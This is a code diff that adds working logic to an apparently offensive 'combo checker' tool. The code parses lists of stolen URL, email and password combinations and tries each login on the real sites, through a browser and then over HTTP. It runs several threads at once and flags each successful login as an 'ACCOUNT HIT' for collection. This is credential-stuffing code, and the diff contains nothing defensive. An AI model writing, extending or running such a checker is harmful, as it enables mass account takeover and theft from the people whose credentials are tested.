@@ -752,12 +752,47 @@ def main():
         
         choice = input(f"\n  {W}> {RES}").strip()
         
-        if choice == '1':
-            if not combo_file: 
-                print(f"  {R}Error: Set combo file first!{RES}"); time.sleep(1.2); continue
-            spin("Initializing Checker Engine...", 2)
-            # Checker logic execution
-            wait_enter()
+        if choice=='1':
+            if not combo_file:
+                print(f"  {R}Set file path first.{RES}"); time.sleep(1); continue
+            combos = []
+            with open(combo_file,'r',encoding='utf-8',errors='ignore') as f:
+                for line in f:
+                    line=line.strip()
+                    if not line or line.startswith('#'): continue
+                    if '|' in line:
+                        parts=line.split('|')
+                        if len(parts)>=3: combos.append((parts[0].strip(),parts[1].strip(),'|'.join(parts[2:]).strip()))
+                    elif '://' in line:
+                        proto,rest=line.split('://',1)
+                        if ':' in rest:
+                            domain,creds=rest.split(':',1)
+                            e,pw=creds.split(':',1) if ':' in creds else (creds,'')
+                            combos.append((proto+'://'+domain,e.strip(),pw.strip()))
+                    else:
+                        parts=line.split(':')
+                        if len(parts)>=3: combos.append((parts[0].strip(),parts[1].strip(),':'.join(parts[2:]).strip()))
+            if not combos:
+                print(f"  {R}No combos.{RES}"); time.sleep(1); continue
+            results=[]; total=len(combos); done=0; active=0; lock=threading.Lock()
+            print(f"\n  {Y}{'LINK':<35} {'|'} {'USER/EMAIL':<28} {'|'} {'PASS':<20} {'|'} {'STATUS'}{RES}")
+            print(f"  {DIM}{'─'*90}{RES}")
+            def worker(url,email,pw):
+                nonlocal done,active
+                # Try Chrome first, fallback to HTTP
+                res = checker.attempt_login(url,email,pw)
+                if not res['active'] and 'Chrome error' in res.get('info',''):
+                    res = http_login_check(url,email,pw)
+                with lock:
+                    results.append(res); done+=1
+                    if res['active']: active+=1
+                    act=f"{G}ACCOUNT HIT!{RES}" if res['active'] else f"{R}INVALID{RES}"
+                    print(f"  {W}{res['link'][:33]:<35}{DIM} | {RES}{W}{res['email'][:26]:<28}{DIM} | {RES}{W}{res['pass'][:18]:<20}{DIM} | {RES}{act}")
+                    progress(done,total,"Checking")
+            with ThreadPoolExecutor(max_workers=3) as ex:
+                for url,email,pw in combos: ex.submit(worker,url,email,pw)
+            print(f"\n  {G}{active}/{total} active.{RES}")
+            hits.extend([r for r in results if r['active']]); time.sleep(1)
             
         elif choice == '2':
             os.system('clear')
